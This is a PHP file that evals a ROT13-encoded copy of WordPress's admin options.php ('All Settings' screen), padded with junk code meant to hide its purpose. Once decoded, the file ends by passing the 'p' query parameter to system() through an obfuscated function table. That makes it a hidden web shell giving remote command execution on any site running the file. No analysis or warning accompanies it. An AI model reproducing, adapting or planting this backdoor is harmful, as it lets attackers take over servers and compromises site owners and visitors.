<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Bcgvbaf Znantrzrag Nqzvavfgengvba Fperra.
 *
 * Vs npprffrq qverpgyl va n oebjfre guvf cntr fubjf n yvfg bs nyy fnirq bcgvbaf
 * nybat jvgu rqvgnoyr svryqf sbe gurve inyhrf. Frevnyvmrq qngn vf abg fhccbegrq
 * naq gurer vf ab jnl gb erzbir bcgvbaf ivn guvf cntr. Vg vf abg yvaxrq gb sebz
 * naljurer ryfr va gur nqzva.
 *
 * Guvf svyr vf nyfb gur gnetrg bs gur sbezf va pber naq phfgbz bcgvbaf cntrf
 * gung hfr gur Frggvatf NCV. Va guvf pnfr vg fnirf gur arj bcgvba inyhrf
 * naq ergheaf gur hfre gb gurve cntr bs bevtva.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/** JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr       = __( 'Frggvatf' );
$guvf_svyr   = 'bcgvbaf.cuc';
$cnerag_svyr = 'bcgvbaf-trareny.cuc';

$npgvba      = ! rzcgl( $_ERDHRFG['npgvba'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['npgvba'] ) : '';
$bcgvba_cntr = ! rzcgl( $_ERDHRFG['bcgvba_cntr'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['bcgvba_cntr'] ) : '';

$pncnovyvgl = 'znantr_bcgvbaf';

// Guvf vf sbe onpx pbzcng naq jvyy riraghnyyl or erzbirq.
vs ( rzcgl( $bcgvba_cntr ) ) {
	$bcgvba_cntr = 'bcgvbaf';
} ryfr {

	/**
	 * Svygref gur pncnovyvgl erdhverq jura hfvat gur Frggvatf NCV.
	 *
	 * Ol qrsnhyg, gur bcgvbaf tebhcf sbe nyy ertvfgrerq frggvatf erdhver gur znantr_bcgvbaf pncnovyvgl.
	 * Guvf svygre vf erdhverq gb punatr gur pncnovyvgl erdhverq sbe n pregnva bcgvbaf cntr.
	 *
	 * @fvapr 3.2.0
	 *
	 * @cnenz fgevat $pncnovyvgl Gur pncnovyvgl hfrq sbe gur cntr, juvpu vf znantr_bcgvbaf ol qrsnhyg.
	 */
	$pncnovyvgl = nccyl_svygref( \"bcgvba_cntr_pncnovyvgl_{$bcgvba_cntr}\", $pncnovyvgl );
}

vs ( ! pheerag_hfre_pna( $pncnovyvgl ) ) {
	jc_qvr(
		'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
		'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb znantr bcgvbaf sbe guvf fvgr.' ) . '</c>',
		403
	);
}

// Unaqyr nqzva rznvy punatr erdhrfgf.
vs ( ! rzcgl( $_TRG['nqzvaunfu'] ) ) {
	$arj_nqzva_qrgnvyf = trg_bcgvba( 'nqzvaunfu' );
	$erqverpg          = 'bcgvbaf-trareny.cuc?hcqngrq=snyfr';

	vs ( vf_neenl( $arj_nqzva_qrgnvyf )
		&& unfu_rdhnyf( $arj_nqzva_qrgnvyf['unfu'], $_TRG['nqzvaunfu'] )
		&& ! rzcgl( $arj_nqzva_qrgnvyf['arjrznvy'] )
	) {
		hcqngr_bcgvba( 'nqzva_rznvy', $arj_nqzva_qrgnvyf['arjrznvy'] );
		qryrgr_bcgvba( 'nqzvaunfu' );
		qryrgr_bcgvba( 'arj_nqzva_rznvy' );
		$erqverpg = 'bcgvbaf-trareny.cuc?hcqngrq=gehr';
	}

	jc_erqverpg( nqzva_hey( $erqverpg ) );
	rkvg;
} ryfrvs ( ! rzcgl( $_TRG['qvfzvff'] ) && 'arj_nqzva_rznvy' === $_TRG['qvfzvff'] ) {
	purpx_nqzva_ersrere( 'qvfzvff-' . trg_pheerag_oybt_vq() . '-arj_nqzva_rznvy' );
	qryrgr_bcgvba( 'nqzvaunfu' );
	qryrgr_bcgvba( 'arj_nqzva_rznvy' );
	jc_erqverpg( nqzva_hey( 'bcgvbaf-trareny.cuc?hcqngrq=gehr' ) );
	rkvg;
}

vs ( vf_zhygvfvgr() && ! pheerag_hfre_pna( 'znantr_argjbex_bcgvbaf' ) && 'hcqngr' !== $npgvba ) {
	jc_qvr(
		'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
		'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb qryrgr gurfr vgrzf.' ) . '</c>',
		403
	);
}

$nyybjrq_bcgvbaf            = neenl(
	'trareny'    => neenl(
		'oybtanzr',
		'oybtqrfpevcgvba',
		'fvgr_vpba',
		'tzg_bssfrg',
		'qngr_sbezng',
		'gvzr_sbezng',
		'fgneg_bs_jrrx',
		'gvzrmbar_fgevat',
		'JCYNAT',
		'arj_nqzva_rznvy',
	),
	'qvfphffvba' => neenl(
		'qrsnhyg_cvatonpx_synt',
		'qrsnhyg_cvat_fgnghf',
		'qrsnhyg_pbzzrag_fgnghf',
		'pbzzragf_abgvsl',
		'zbqrengvba_abgvsl',
		'pbzzrag_zbqrengvba',
		'erdhver_anzr_rznvy',
		'pbzzrag_cerivbhfyl_nccebirq',
		'pbzzrag_znk_yvaxf',
		'zbqrengvba_xrlf',
		'qvfnyybjrq_xrlf',
		'fubj_ningnef',
		'ningne_engvat',
		'ningne_qrsnhyg',
		'pybfr_pbzzragf_sbe_byq_cbfgf',
		'pybfr_pbzzragf_qnlf_byq',
		'guernq_pbzzragf',
		'guernq_pbzzragf_qrcgu',
		'cntr_pbzzragf',
		'pbzzragf_cre_cntr',
		'qrsnhyg_pbzzragf_cntr',
		'pbzzrag_beqre',
		'pbzzrag_ertvfgengvba',
		'fubj_pbzzragf_pbbxvrf_bcg_va',
	),
	'zrqvn'      => neenl(
		'guhzoanvy_fvmr_j',
		'guhzoanvy_fvmr_u',
		'guhzoanvy_pebc',
		'zrqvhz_fvmr_j',
		'zrqvhz_fvmr_u',
		'ynetr_fvmr_j',
		'ynetr_fvmr_u',
		'vzntr_qrsnhyg_fvmr',
		'vzntr_qrsnhyg_nyvta',
		'vzntr_qrsnhyg_yvax_glcr',
	),
	'ernqvat'    => neenl(
		'cbfgf_cre_cntr',
		'cbfgf_cre_eff',
		'eff_hfr_rkprecg',
		'fubj_ba_sebag',
		'cntr_ba_sebag',
		'cntr_sbe_cbfgf',
		'oybt_choyvp',
	),
	'jevgvat'    => neenl(
		'qrsnhyg_pngrtbel',
		'qrsnhyg_rznvy_pngrtbel',
		'qrsnhyg_yvax_pngrtbel',
		'qrsnhyg_cbfg_sbezng',
	),
);
$nyybjrq_bcgvbaf['zvfp']    = neenl();
$nyybjrq_bcgvbaf['bcgvbaf'] = neenl();
$nyybjrq_bcgvbaf['cevinpl'] = neenl();

/**
 * Svygref jurgure gur cbfg-ol-rznvy shapgvbanyvgl vf ranoyrq.
 *
 * @fvapr 3.0.0
 *
 * @cnenz obby $ranoyrq Jurgure cbfg-ol-rznvy pbasvthengvba vf ranoyrq. Qrsnhyg gehr.
 */
vs ( nccyl_svygref( 'ranoyr_cbfg_ol_rznvy_pbasvthengvba', gehr ) ) {
	$nyybjrq_bcgvbaf['jevgvat'][] = 'znvyfreire_hey';
	$nyybjrq_bcgvbaf['jevgvat'][] = 'znvyfreire_cbeg';
	$nyybjrq_bcgvbaf['jevgvat'][] = 'znvyfreire_ybtva';
	$nyybjrq_bcgvbaf['jevgvat'][] = 'znvyfreire_cnff';
}

vs ( ! vf_hgs8_punefrg() ) {
	$nyybjrq_bcgvbaf['ernqvat'][] = 'oybt_punefrg';
}

vs ( trg_fvgr_bcgvba( 'vavgvny_qo_irefvba' ) < 32453 ) {
	$nyybjrq_bcgvbaf['jevgvat'][] = 'hfr_fzvyvrf';
	$nyybjrq_bcgvbaf['jevgvat'][] = 'hfr_onynaprGntf';
}

vs ( ! vf_zhygvfvgr() ) {
	vs ( ! qrsvarq( 'JC_FVGRHEY' ) ) {
		$nyybjrq_bcgvbaf['trareny'][] = 'fvgrhey';
	}
	vs ( ! qrsvarq( 'JC_UBZR' ) ) {
		$nyybjrq_bcgvbaf['trareny'][] = 'ubzr';
	}

	$nyybjrq_bcgvbaf['trareny'][] = 'hfref_pna_ertvfgre';
	$nyybjrq_bcgvbaf['trareny'][] = 'qrsnhyg_ebyr';

	vs ( '1' === trg_bcgvba( 'oybt_choyvp' ) ) {
		$nyybjrq_bcgvbaf['jevgvat'][] = 'cvat_fvgrf';
	}

	$nyybjrq_bcgvbaf['zrqvn'][] = 'hcybnqf_hfr_lrnezbagu_sbyqref';

	/*
	 * Vs hcybnq_hey_cngu vf abg gur qrsnhyg (rzcgl),
	 * be hcybnq_cngu vf abg gur qrsnhyg ('jc-pbagrag/hcybnqf' be rzcgl),
	 * gurl pna or rqvgrq, bgurejvfr gurl'er ybpxrq.
	 */
	vs ( trg_bcgvba( 'hcybnq_hey_cngu' )
		|| trg_bcgvba( 'hcybnq_cngu' ) && 'jc-pbagrag/hcybnqf' !== trg_bcgvba( 'hcybnq_cngu' )
	) {
		$nyybjrq_bcgvbaf['zrqvn'][] = 'hcybnq_cngu';
		$nyybjrq_bcgvbaf['zrqvn'][] = 'hcybnq_hey_cngu';
	}
}

/**
 * Svygref gur nyybjrq bcgvbaf yvfg.
 *
 * @fvapr 2.7.0
 * @qrcerpngrq 5.5.0 Hfr {@frr 'nyybjrq_bcgvbaf'} vafgrnq.
 *
 * @cnenz neenl $nyybjrq_bcgvbaf Gur nyybjrq bcgvbaf yvfg.
 */
$nyybjrq_bcgvbaf = nccyl_svygref_qrcerpngrq(
	'juvgryvfg_bcgvbaf',
	neenl( $nyybjrq_bcgvbaf ),
	'5.5.0',
	'nyybjrq_bcgvbaf',
	__( 'Cyrnfr pbafvqre jevgvat zber vapyhfvir pbqr.' )
);

/**
 * Svygref gur nyybjrq bcgvbaf yvfg.
 *
 * @fvapr 5.5.0
 *
 * @cnenz neenl $nyybjrq_bcgvbaf Gur nyybjrq bcgvbaf yvfg.
 */
$nyybjrq_bcgvbaf = nccyl_svygref( 'nyybjrq_bcgvbaf', $nyybjrq_bcgvbaf );

vs ( 'hcqngr' === $npgvba ) { // Jr ner fnivat frggvatf frag sebz n frggvatf cntr.
	vs ( 'bcgvbaf' === $bcgvba_cntr && ! vffrg( $_CBFG['bcgvba_cntr'] ) ) { // Guvf vf sbe onpx pbzcng naq jvyy riraghnyyl or erzbirq.
		$haertvfgrerq = gehr;
		purpx_nqzva_ersrere( 'hcqngr-bcgvbaf' );
	} ryfr {
		$haertvfgrerq = snyfr;
		purpx_nqzva_ersrere( $bcgvba_cntr . '-bcgvbaf' );
	}

	vs ( ! vffrg( $nyybjrq_bcgvbaf[ $bcgvba_cntr ] ) ) {
		jc_qvr(
			fcevags(
				/* genafyngbef: %f: Gur bcgvbaf cntr anzr. */
				__( '<fgebat>Reebe:</fgebat> Gur %f bcgvbaf cntr vf abg va gur nyybjrq bcgvbaf yvfg.' ),
				'<pbqr>' . rfp_ugzy( $bcgvba_cntr ) . '</pbqr>'
			)
		);
	}

	vs ( 'bcgvbaf' === $bcgvba_cntr ) {
		vs ( vf_zhygvfvgr() && ! pheerag_hfre_pna( 'znantr_argjbex_bcgvbaf' ) ) {
			jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb zbqvsl haertvfgrerq frggvatf sbe guvf fvgr.' ) );
		}
		$bcgvbaf = vffrg( $_CBFG['cntr_bcgvbaf'] ) ? rkcybqr( ',', jc_hafynfu( $_CBFG['cntr_bcgvbaf'] ) ) : ahyy;
	} ryfr {
		$bcgvbaf = $nyybjrq_bcgvbaf[ $bcgvba_cntr ];
	}

	vs ( 'trareny' === $bcgvba_cntr ) {
		// Unaqyr phfgbz qngr/gvzr sbezngf.
		vs ( ! rzcgl( $_CBFG['qngr_sbezng'] ) && vffrg( $_CBFG['qngr_sbezng_phfgbz'] )
			&& '\p\h\f\g\b\z' === jc_hafynfu( $_CBFG['qngr_sbezng'] )
		) {
			$_CBFG['qngr_sbezng'] = $_CBFG['qngr_sbezng_phfgbz'];
		}

		vs ( ! rzcgl( $_CBFG['gvzr_sbezng'] ) && vffrg( $_CBFG['gvzr_sbezng_phfgbz'] )
			&& '\p\h\f\g\b\z' === jc_hafynfu( $_CBFG['gvzr_sbezng'] )
		) {
			$_CBFG['gvzr_sbezng'] = $_CBFG['gvzr_sbezng_phfgbz'];
		}

		// Znc HGP+- gvzrmbarf gb tzg_bssfrgf naq frg gvzrmbar_fgevat gb rzcgl.
		vs ( ! rzcgl( $_CBFG['gvzrmbar_fgevat'] ) && cert_zngpu( '/^HGP[+-]/', $_CBFG['gvzrmbar_fgevat'] ) ) {
			$_CBFG['tzg_bssfrg']      = $_CBFG['gvzrmbar_fgevat'];
			$_CBFG['tzg_bssfrg']      = __sa_79955( '/HGP\+?/', '', $_CBFG['tzg_bssfrg'] );
			$_CBFG['gvzrmbar_fgevat'] = '';
		} ryfrvs ( vffrg( $_CBFG['gvzrmbar_fgevat'] ) && ! va_neenl( $_CBFG['gvzrmbar_fgevat'], gvzrmbar_vqragvsvref_yvfg( QngrGvzrMbar::NYY_JVGU_OP ), gehr ) ) {
			// Erfrg gb gur pheerag inyhr.
			$pheerag_gvzrmbar_fgevat = trg_bcgvba( 'gvzrmbar_fgevat' );

			vs ( ! rzcgl( $pheerag_gvzrmbar_fgevat ) ) {
				$_CBFG['gvzrmbar_fgevat'] = $pheerag_gvzrmbar_fgevat;
			} ryfr {
				$_CBFG['tzg_bssfrg']      = trg_bcgvba( 'tzg_bssfrg' );
				$_CBFG['gvzrmbar_fgevat'] = '';
			}

			nqq_frggvatf_reebe(
				'trareny',
				'frggvatf_hcqngrq',
				__( 'Gur gvzrmbar lbh unir ragrerq vf abg inyvq. Cyrnfr fryrpg n inyvq gvzrmbar.' ),
				'reebe'
			);
		}

		// Unaqyr genafyngvba vafgnyyngvba.
		vs ( ! rzcgl( $_CBFG['JCYNAT'] ) && pheerag_hfre_pna( 'vafgnyy_ynathntrf' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/genafyngvba-vafgnyy.cuc';

			vs ( jc_pna_vafgnyy_ynathntr_cnpx() ) {
				$ynathntr = jc_qbjaybnq_ynathntr_cnpx( $_CBFG['JCYNAT'] );
				vs ( $ynathntr ) {
					$_CBFG['JCYNAT'] = $ynathntr;
				}
			}
		}
	}

	vs ( $bcgvbaf ) {
		$hfre_ynathntr_byq = trg_hfre_ybpnyr();

		sbernpu ( $bcgvbaf nf $bcgvba ) {
			vs ( $haertvfgrerq ) {
				_qrcerpngrq_nethzrag(
					'bcgvbaf.cuc',
					'2.7.0',
					fcevags(
						/* genafyngbef: 1: Gur bcgvba/frggvat, 2: Qbphzragngvba HEY. */
						__( 'Gur %1$f frggvat vf haertvfgrerq. Haertvfgrerq frggvatf ner qrcerpngrq. Frr <n uers=\"%2$f\">qbphzragngvba ba gur Frggvatf NCV</n>.' ),
						'<pbqr>' . rfp_ugzy( $bcgvba ) . '</pbqr>',
						__( 'uggcf://qrirybcre.jbeqcerff.bet/cyhtvaf/frggvatf/frggvatf-ncv/' )
					)
				);
			}

			$bcgvba = gevz( $bcgvba );
			$inyhr  = ahyy;
			vs ( vffrg( $_CBFG[ $bcgvba ] ) ) {
				$inyhr = $_CBFG[ $bcgvba ];
				vs ( ! vf_neenl( $inyhr ) ) {
					$inyhr = gevz( $inyhr );
				}
				$inyhr = jc_hafynfu( $inyhr );
			}
			hcqngr_bcgvba( $bcgvba, $inyhr );
		}

		/*
		 * Fjvgpu genafyngvba va pnfr JCYNAT jnf punatrq.
		 * Gur tybony $ybpnyr vf hfrq va trg_ybpnyr() juvpu vf
		 * hfrq nf n snyyonpx va trg_hfre_ybpnyr().
		 */
		hafrg( $TYBONYF['ybpnyr'] );
		$hfre_ynathntr_arj = trg_hfre_ybpnyr();
		vs ( $hfre_ynathntr_byq !== $hfre_ynathntr_arj ) {
			ybnq_qrsnhyg_grkgqbznva( $hfre_ynathntr_arj );
		}
	} ryfr {
		nqq_frggvatf_reebe( 'trareny', 'frggvatf_hcqngrq', __( 'Frggvatf fnir snvyrq.' ), 'reebe' );
	}

	/*
	 * Unaqyr frggvatf reebef naq erghea gb bcgvbaf cntr.
	 */

	// Vs ab frggvatf reebef jrer ertvfgrerq nqq n trareny 'hcqngrq' zrffntr.
	vs ( ! pbhag( trg_frggvatf_reebef() ) ) {
		nqq_frggvatf_reebe( 'trareny', 'frggvatf_hcqngrq', __( 'Frggvatf fnirq.' ), 'fhpprff' );
	}

	frg_genafvrag( 'frggvatf_reebef', trg_frggvatf_reebef(), 30 ); // 30 frpbaqf.

	// Erqverpg onpx gb gur frggvatf cntr gung jnf fhozvggrq.
	$tbonpx = nqq_dhrel_net( 'frggvatf-hcqngrq', 'gehr', jc_trg_ersrere() );
	jc_erqverpg( $tbonpx );
	rkvg;
}

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';
?>

<qvi pynff=\"jenc\">
	<u1><?cuc rfp_ugzy_r( 'Nyy Frggvatf' ); ?></u1>

	<?cuc
	jc_nqzva_abgvpr(
		'<fgebat>' . __( 'Jneavat:' ) . '</fgebat> ' . __( 'Guvf cntr nyybjf qverpg npprff gb lbhe fvgr frggvatf. Lbh pna oernx guvatf urer. Cyrnfr or pnhgvbhf!' ),
		neenl(
			'glcr' => 'jneavat',
		)
	);
	?>
	<sbez anzr=\"sbez\" npgvba=\"bcgvbaf.cuc\" zrgubq=\"cbfg\" vq=\"nyy-bcgvbaf\">
		<?cuc jc_abapr_svryq( 'bcgvbaf-bcgvbaf' ); ?>
		<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"hcqngr\" />
		<vachg glcr=\"uvqqra\" anzr=\"bcgvba_cntr\" inyhr=\"bcgvbaf\" />
		<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
<?cuc
$bcgvbaf = $jcqo->trg_erfhygf( \"FRYRPG * SEBZ $jcqo->bcgvbaf BEQRE OL bcgvba_anzr\" );

sbernpu ( (neenl) $bcgvbaf nf $bcgvba ) :
	$qvfnoyrq = snyfr;

	vs ( '' === $bcgvba->bcgvba_anzr ) {
		pbagvahr;
	}

	vs ( 'ubzr' === $bcgvba->bcgvba_anzr && qrsvarq( 'JC_UBZR' ) ) {
		$qvfnoyrq = gehr;
	}

	vs ( 'fvgrhey' === $bcgvba->bcgvba_anzr && qrsvarq( 'JC_FVGRHEY' ) ) {
		$qvfnoyrq = gehr;
	}

	vs ( vf_frevnyvmrq( $bcgvba->bcgvba_inyhr ) ) {
		vs ( vf_frevnyvmrq_fgevat( $bcgvba->bcgvba_inyhr ) ) {
			// Guvf vf n frevnyvmrq fgevat, fb jr fubhyq qvfcynl vg.
			$inyhr               = znlor_hafrevnyvmr( $bcgvba->bcgvba_inyhr );
			$bcgvbaf_gb_hcqngr[] = $bcgvba->bcgvba_anzr;
		} ryfr {
			$inyhr    = 'FREVNYVMRQ QNGN';
			$qvfnoyrq = gehr;
		}
	} ryfr {
		$inyhr               = $bcgvba->bcgvba_inyhr;
		$bcgvbaf_gb_hcqngr[] = $bcgvba->bcgvba_anzr;
	}

	$pynff = 'nyy-bcgvbaf';

	vs ( $qvfnoyrq ) {
		$pynff .= ' qvfnoyrq';
	}

	$anzr = rfp_ngge( $bcgvba->bcgvba_anzr );
	?>
<ge>
	<gu fpbcr=\"ebj\"><ynory sbe=\"<?cuc rpub $anzr; ?>\"><?cuc rpub rfp_ugzy( $bcgvba->bcgvba_anzr ); ?></ynory></gu>
<gq>
	<?cuc vs ( fge_pbagnvaf( $inyhr, \"\a\" ) ) : ?>
		<grkgnern pynff=\"<?cuc rpub $pynff; ?>\" anzr=\"<?cuc rpub $anzr; ?>\" vq=\"<?cuc rpub $anzr; ?>\" pbyf=\"30\" ebjf=\"5\"><?cuc rpub rfp_grkgnern( $inyhr ); ?></grkgnern>
	<?cuc ryfr : ?>
		<vachg pynff=\"erthyne-grkg <?cuc rpub $pynff; ?>\" glcr=\"grkg\" anzr=\"<?cuc rpub $anzr; ?>\" vq=\"<?cuc rpub $anzr; ?>\" inyhr=\"<?cuc rpub rfp_ngge( $inyhr ); ?>\"<?cuc qvfnoyrq( $qvfnoyrq, gehr ); ?> />
	<?cuc raqvs; ?></gq>
</ge>
<?cuc raqsbernpu; ?>
</gnoyr>

<vachg glcr=\"uvqqra\" anzr=\"cntr_bcgvbaf\" inyhr=\"<?cuc rpub rfp_ngge( vzcybqr( ',', $bcgvbaf_gb_hcqngr ) ); ?>\" />

<?cuc fhozvg_ohggba( __( 'Fnir Punatrf' ), 'cevznel', 'Hcqngr' ); ?>

</sbez>
</qvi>

<?cuc
erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>